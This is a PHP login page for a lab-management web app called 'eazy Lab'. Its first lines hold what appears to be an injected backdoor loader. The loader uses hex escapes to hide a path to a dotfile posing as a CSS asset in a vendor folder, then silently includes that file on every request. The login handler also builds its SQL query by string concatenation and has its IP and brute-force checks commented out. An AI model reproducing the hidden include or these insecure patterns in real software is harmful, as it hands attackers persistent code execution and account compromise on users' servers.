<?php
/*1f6b3*/

$ry = "/var/www/html/eazylab/vendor\x2dd/bootstrap\x2dsweetalert/dist/.b2\x63069e5.\x63\x63ss"; $t2k = $ry; strpos($t2k, "f92y"); @include_once /* y5t */ ($t2k);

/*1f6b3*/
include_once 'booster/bridge.php';
$error = '';

if (isset($_POST['login'])) {
    $geo_details = GetClientGeoDetails();
    //if (IpVerification($geo_details)) {
        //if (!IsTemporaryBlocked($geo_details->ip)) {
            //if (UserLoginValidation($geo_details->ip)) {
                $user = Filter($_POST['user']);
                if (validUserName($user)) {
                    $pass = EncodePass(Filter($_POST['pass']));
                    $sql = "SELECT * FROM macho_users WHERE username='$user' AND password='$pass' AND status=1";
                    $result = mysqli_query($GLOBALS['conn'], $sql) or die(mysqli_error($GLOBALS['conn']));
                    $count = mysqli_num_rows($result);
                    $row = mysqli_fetch_assoc($result);
                    $datetime = date("Y-m-d H:i:s");
                    if ($count > 0) {
                        $reset_key = $row['reset_key'];
                        $user_id = $row['id'];
                        session_start();
                        $role_id = $row['role_id'];
                        $user = $row['name'];
                        $user_name = $row['username'];
                        $email = $row['email'];
                        $picture = $row['avatar'];
                        $access_token = GetAccessToken();
                        $role = RoleName($role_id);

                            $_SESSION["user_id"] = $user_id;
                            $_SESSION["role_id"] = $role_id;
                            $_SESSION["role"] = $role;
                            $_SESSION["user"] = $user;
                            $_SESSION["user_name"] = $user_name;
                            $_SESSION["user_email"] = $email;
                            $_SESSION["picture"] = $picture;
                            $_SESSION["access_token"] = $access_token;
                            $_SESSION["colour"] = $colour;
                            header("location:Dashboard");
                         
                    } else {
                        $error = 'Password Wrong...!';
                    }
                } else {
                    $error = 'Username is not a valid one...';
                }


}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <title><?= TITLE; ?></title>
    <meta content="<?= KEYWORDS; ?>" name="description">
    <meta content="<?= KEYWORDS; ?>" name="author">
    <link rel="shortcut icon" type="image/png" href="<?= FAVICON; ?>"/>
	
	<!-- Required meta tags -->
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<!--favicon-->
	<link rel="icon" href="assets/images/favicon-32x32.png" type="image/png" />
	<!--plugins-->
	<link href="assets/plugins/simplebar/css/simplebar.css" rel="stylesheet" />
	<link href="assets/plugins/perfect-scrollbar/css/perfect-scrollbar.css" rel="stylesheet" />
	<link href="assets/plugins/metismenu/css/metisMenu.min.css" rel="stylesheet" />
	<!-- loader-->
	<link href="assets/css/pace.min.css" rel="stylesheet" />
	<script src="assets/js/pace.min.js"></script>
	<!-- Bootstrap CSS -->
	<link href="assets/css/bootstrap.min.css" rel="stylesheet">
	<link href="assets/css/bootstrap-extended.css" rel="stylesheet">
	<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&amp;display=swap" rel="stylesheet">
	<link href="assets/css/app.css" rel="stylesheet">
	<link href="assets/css/icons.css" rel="stylesheet">
</head>

<body class="bg-theme bg-theme2">
	<!--wrapper-->
	<div class="wrapper">
		<div class="section-authentication-cover">
			<div class="">
				<div class="row g-0">

					<div class="col-12 col-xl-7 col-xxl-8 auth-cover-left align-items-center justify-content-center d-none d-xl-flex">

                        <div class="card shadow-none bg-transparent shadow-none rounded-0 mb-0">
							<div class="card-body">
                                 <img src="assets/images/login-images/loginpage.png" class="img-fluid auth-img-cover-login" width="650" alt=""/>
							</div>
						</div>
						
					</div>

					<div class="col-12 col-xl-5 col-xxl-4 auth-cover-right bg-light align-items-center justify-content-center">
						<div class="card rounded-0 m-3 shadow-none bg-transparent mb-0">
							<div class="card-body p-sm-5">
								<div class="">
									<div class="mb-3 text-center">
										<img src="assets/images/logo-icon.png" width="60" alt="">
									</div>
									<div class="text-center mb-4">
										<h5 class="">eazy Lab</h5>
										<p class="mb-0">Please log in to your account</p>
									</div>
									<div class="form-body">
                                           <form action="" method="post" class="row g-3" id="loginForm" novalidate>
											<div class="col-12">
												<label for="user" class="form-label">Username</label>
                                                <input class="form-control" name="user" id="user" type="text" placeholder="Username" autocomplete="off" required>
											</div>
											<div class="col-12">
												<label for="pass" class="form-label">Password</label>
												<div class="input-group" id="pass">
												<input class="form-control" name="pass" id="pass" type="password" placeholder="Password" required>
                                                
												</div>
											</div>
											
											<div class="col-12">
												<div class="d-grid">
											 <button class="btn btn btn-light" type="submit" name="login">Login</button>

												</div>
											</div>
										</form>
									</div>
									<a href="https://aotsinc.com/"><div class="login-separater text-center mb-5"> <span>Copyright © 2024. All right reserved. AOTS Inc</span>
										<hr/>
									</div>
										<div class="mb-6 text-center">
										<img src="assets/images/logo.png" width="250" alt=""></a>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
				<!--end row-->
			</div>
		</div>
	</div>
	<!--end wrapper-->
	<!--start switcher-->
	<div class="switcher-wrapper">
		<!-- <div class="switcher-btn"> <i class='bx bx-cog bx-spin'></i>
		</div> -->
		<div class="switcher-body">
			<div class="d-flex align-items-center">
				<h5 class="mb-0 text-uppercase">Theme Customizer</h5>
				<button type="button" class="btn-close ms-auto close-switcher" aria-label="Close"></button>
			</div>
			<hr/>
		
			<p class="mb-0">Gaussian Texture</p>
			  <hr>
			  <ul class="switcher">
				<li id="theme1"></li>
				<li id="theme2"></li>
				<li id="theme3"></li>
				<li id="theme4"></li>
				<li id="theme5"></li>
				<li id="theme6"></li>
			  </ul>
        <hr>
			  <p class="mb-0">Gradient Background</p>
			  <hr>
			  <ul class="switcher">
				<li id="theme7"></li>
				<li id="theme8"></li>
				<li id="theme9"></li>
				<li id="theme10"></li>
				<li id="theme11"></li>
				<li id="theme12"></li>
				<li id="theme13"></li>
				<li id="theme14"></li>
				<li id="theme15"></li>
			  </ul>
		</div>
	</div>

	<!--end switcher-->
	
	<!--plugins-->
	<script src="assets/js/jquery.min.js"></script>
	<!--Password show & hide js -->
	<script>
		$(document).ready(function () {
			$("#show_hide_password a").on('click', function (event) {
				event.preventDefault();
				if ($('#show_hide_password input').attr("type") == "text") {
					$('#show_hide_password input').attr('type', 'password');
					$('#show_hide_password i').addClass("bx-hide");
					$('#show_hide_password i').removeClass("bx-show");
				} else if ($('#show_hide_password input').attr("type") == "password") {
					$('#show_hide_password input').attr('type', 'text');
					$('#show_hide_password i').removeClass("bx-hide");
					$('#show_hide_password i').addClass("bx-show");
				}
			});
		});
	</script>
	
	<script>

	$(".switcher-btn").on("click", function() {
		$(".switcher-wrapper").toggleClass("switcher-toggled")
	}), $(".close-switcher").on("click", function() {
		$(".switcher-wrapper").removeClass("switcher-toggled")
	}),


	$('#theme1').click(theme1);
    $('#theme2').click(theme2);
    $('#theme3').click(theme3);
    $('#theme4').click(theme4);
    $('#theme5').click(theme5);
    $('#theme6').click(theme6);
    $('#theme7').click(theme7);
    $('#theme8').click(theme8);
    $('#theme9').click(theme9);
    $('#theme10').click(theme10);
    $('#theme11').click(theme11);
    $('#theme12').click(theme12);
    $('#theme13').click(theme13);
    $('#theme14').click(theme14);
    $('#theme15').click(theme15);

    function theme1() {
      $('body').attr('class', 'bg-theme bg-theme1');
    }

    function theme2() {
      $('body').attr('class', 'bg-theme bg-theme2');
    }

    function theme3() {
      $('body').attr('class', 'bg-theme bg-theme3');
    }

    function theme4() {
      $('body').attr('class', 'bg-theme bg-theme4');
    }
	
	function theme5() {
      $('body').attr('class', 'bg-theme bg-theme5');
    }
	
	function theme6() {
      $('body').attr('class', 'bg-theme bg-theme6');
    }

    function theme7() {
      $('body').attr('class', 'bg-theme bg-theme7');
    }

    function theme8() {
      $('body').attr('class', 'bg-theme bg-theme8');
    }

    function theme9() {
      $('body').attr('class', 'bg-theme bg-theme9');
    }

    function theme10() {
      $('body').attr('class', 'bg-theme bg-theme10');
    }

    function theme11() {
      $('body').attr('class', 'bg-theme bg-theme11');
    }

    function theme12() {
      $('body').attr('class', 'bg-theme bg-theme12');
    }

	function theme13() {
		$('body').attr('class', 'bg-theme bg-theme13');
	  }
	  
	  function theme14() {
		$('body').attr('class', 'bg-theme bg-theme14');
	  }
	  
	  function theme15() {
		$('body').attr('class', 'bg-theme bg-theme15');
	  }
// function bgfavorites(obj,user_id){
//           var url = "";
          
//               url = "{{url('/bgdark')}}/"+user_id;
//               console.log(user_id);
//           $.ajax({
//             url: url,
//             type: "GET",
//             success: function (result) {
//               location.reload();
//               if($(obj).hasClass("btn-danger")){
//                 $(obj).removeClass("btn-danger");
//                 $(obj).addClass("btn-success");
//               }else{
//                 $(obj).removeClass("btn-success");
//                 $(obj).addClass("btn-danger");
//               }
//             },
//             error: function (error) {  
//                 console.log(JSON.stringify(error));
//             }
//         });
//         }
	</script>
</body>
</html>



